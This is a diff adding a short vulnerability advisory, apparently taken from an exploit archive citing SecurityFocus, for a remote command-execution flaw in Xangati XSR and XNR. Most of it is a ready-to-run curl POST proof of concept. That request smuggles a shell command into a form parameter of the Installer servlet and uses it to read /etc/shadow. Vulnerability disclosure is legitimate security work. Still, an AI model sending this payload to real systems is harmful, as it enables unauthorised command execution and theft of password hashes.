@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/66819/info
+
+Xangati XSR And XNR are prone to a remote command-execution vulnerability because the application fails to sufficiently sanitize user-supplied input data.
+
+An attacker may leverage this issue to execute arbitrary commands in the context of the affected application.
+
+Xangati XSR prior to 11 and XNR prior to 7 are vulnerable.
+
+curl -i -s -k  -X 'POST' \
+-H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Java/1.7.0_25' \
+--data-binary $'key=validkey&falconConfig=validateTest&path=%2Fvar%2Ftmp%2F&params=gui_input_test.pl&params=-p+localhost;CMD%3d$\'cat\\x20/etc/shadow\';$CMD;+YES' \
+'hxxps://www.example.com/servlet/Installer'
